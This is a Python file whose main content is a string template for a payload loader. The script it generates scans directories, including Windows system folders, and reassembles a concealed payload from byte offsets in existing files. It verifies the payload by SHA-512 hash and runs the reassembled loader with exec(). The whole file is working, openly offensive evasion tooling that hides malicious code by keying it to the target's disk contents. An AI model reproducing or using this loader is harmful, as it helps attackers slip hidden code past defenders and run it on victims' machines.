buildcode = """import os
import hashlib
import sys
import struct
import base64
import zlib
import ctypes
import platform

class build_code():
    def __init__(self, lookup_table, payload_hash, input_file, iterumhash, minus_bytes, loader_lookup_table):
        self.payload_hash = payload_hash
        self.lookup_table = lookup_table
        self.input_file = input_file
        self.loader_lookup_table = loader_lookup_table
        self.payload = ''
        self.check = False
        self.initial_iteration = 0
        self.iterumhash = iterumhash
        self.minus_bytes = int(minus_bytes)

    def check_hash(self):
        # Check the final payload hash - minus_bytes before execution

        if hashlib.sha512(self.payload[:-self.minus_bytes]).hexdigest() == self.payload_hash:
            self.check = True
            print("[*] Hashes are equal!")
            return True
        else:
            return False

    def check_iterum(self):
        # Check test hash before continuing to use decompress the payload

        self.test_hash = hashlib.sha512(self.payload).hexdigest()


    def search(self):
        count = 0

        with open(self.input_file, 'rb') as f:
            
            self.initial_iteration = struct.unpack("<I", self.lookup_table[0:4])[0]
            self.lookup_table = self.lookup_table[4:]
            
            for section in [self.lookup_table[i:i+4] for i in range(0, len(self.lookup_table), 4)]:
                
                # check the test hash
                if count/4 == self.initial_iteration:
                    
                    self.check_iterum()
                    
                    if self.test_hash != self.iterumhash:
                        return False
                    else:
                        print("[*] test_hash, iterumhash", self.test_hash, self.iterumhash)
                        print("[*] Successful test hash check, continuing to decompress full payload")
 
                f.seek(struct.unpack("<I", section[0:3] + struct.pack("<B", 0))[0], 0)
                self.payload += f.read(struct.unpack("<B", section[3:4])[0])
                count += 4

        print("[*] Length of payload:", len(self.payload))

    def execute_code(self):

        # Execute code here
        
        count = 0
        loader_code = ''
        
        with open(self.input_file, 'rb') as f:
            for section in [self.loader_lookup_table[i:i+4] for i in range(0, len(self.loader_lookup_table), 4)]:
                f.seek(struct.unpack("<I", section[0:3] + struct.pack("<B", 0))[0], 0)
                loader_code += f.read(struct.unpack("<B", section[3:4])[0])
                count += 4
        
        exec(loader_code)
        
    
    def run(self):
        self.search()
        if self.check_hash() is True:
            self.execute_code()
            return True


def walk_native64(lookup_table, payload_hash, iterumhash, minus_bytes, loader_lookup_table):
    for root, dirs, files in os.walk(r"c:\Windows\sysnative\", topdown=True):
        for name in files:
            print("[*] Checking:", os.path.join(root, name))
            try:
                result = build_code(lookup_table, payload_hash, os.path.join(root, name), iterumhash, minus_bytes, loader_lookup_table)
                if result.run() is True:
                    return True
            except IOError:
                continue

def walk_os(lookup_table, payload_hash, iterumhash, minus_bytes, scan_dir, loader_lookup_table):
    # make method for 
    # need to add sysnative checks
    
    sys_paths = [r"c:\", r"c:\windows\", r"c:\windows\system32"]
    
    if '32' in platform.architecture()[0] and scan_dir.lower() in sys_paths:
        # 32 bit use sysnative to check x64 c:\Windows\sysnative
        print("[*] Scanning sysnative")
        walk_native64(lookup_table, payload_hash, iterumhash, minus_bytes, loader_lookup_table)

    for root, dirs, files in os.walk(scan_dir, topdown=True):
        for name in files:
            print("[*] Checking:", os.path.join(root, name))
            try:
                result = build_code(lookup_table, payload_hash, os.path.join(root, name), iterumhash, minus_bytes, loader_lookup_table)
                if result.run() is True:
                    return True
            except IOError:
                continue


def main():
    lookup_table = zlib.decompress(base64.b64decode("{0}"))
    payload_hash = "{1}"
    iterumhash = "{2}"
    minus_bytes = "{3}"
    scan_dir = r"{5}"
    loader_lookup_table = zlib.decompress(base64.b64decode("{4}"))
    
    if scan_dir.endswith("%") and scan_dir.startswith("%"):
        print("[*] Using env variable for directory scanning:", scan_dir)
        # over write scan_dir variable
        # strip staring and ending % from env var
        scan_dir = os.getenv(scan_dir[1:-1])
        print("[*] Starting path", scan_dir)
        if scan_dir == None:
            sys.exit(0)

    walk_os(lookup_table, payload_hash, iterumhash, minus_bytes, scan_dir, loader_lookup_table)
    

if __name__ == "__main__":
    main()
"""
